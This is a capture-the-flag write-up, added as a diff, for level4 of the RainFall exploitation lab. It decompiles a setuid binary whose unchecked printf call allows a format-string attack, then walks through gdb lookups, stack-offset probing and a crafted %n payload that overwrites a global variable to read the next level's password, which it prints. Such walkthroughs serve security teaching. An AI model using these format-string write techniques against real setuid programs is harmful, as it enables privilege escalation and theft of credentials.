@@ -1,0 +1,73 @@
+
+```bash
+level4@RainFall:~$ ls -la
+-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
+
+level4@RainFall:~$ file level4 
+level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
+```
+
+Reversed in c:
+```c
+int m = 0;
+
+int p(char *format)
+{
+    return printf(format);
+}
+
+int n(void)
+{
+    int result;
+    char s[520];
+
+    fgets(s, 512, stdin);
+    p(s);
+    result = m;
+    if (m == 16930116)
+    {
+        return system("/bin/cat /home/user/level5/.pass");
+    }
+    return result;
+}
+
+int main(void)
+{
+    return n();
+}
+```
+
+This is a basic `printf()` format vulnarability
+Here the user input is directly gived to `printf()`, allowing us to run formated string on it (`%p` `%s` `%n`) for exemple
+
+First we need to find m:
+```bash
+level4@RainFall:~$ gdb level4
+(gdb) info address m
+Symbol "m" is at 0x8049810 in a file compiled without debugging.
+```
+
+After we need to find where we are on the stack:
+```bash
+level4@RainFall:~$ echo "AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x" > /tmp/payload_4
+level4@RainFall:~$ cat /tmp/payload_4 | ./level4
+AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+
+```
+the start of the array is the 12 value printed
+
+Now this is strait forward, we gonna add as many character we need to have 16930116 as value
+```bash
+rm -f /tmp/payload_4
+echo -ne "\x10\x98\x04\x08" > /tmp/payload_4 # 4 character for the address of m
+echo -ne "%16930112d" >> /tmp/payload_4 # pad 16930116 - 4 character
+echo -ne "%12\$n" >> /tmp/payload_4 # we use %n to set the value of m
+```
+
+we run it:
+```bash
+level4@RainFall:~$ cat /tmp/payload_4 - | ./level4 
+(...)
+                                             -1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
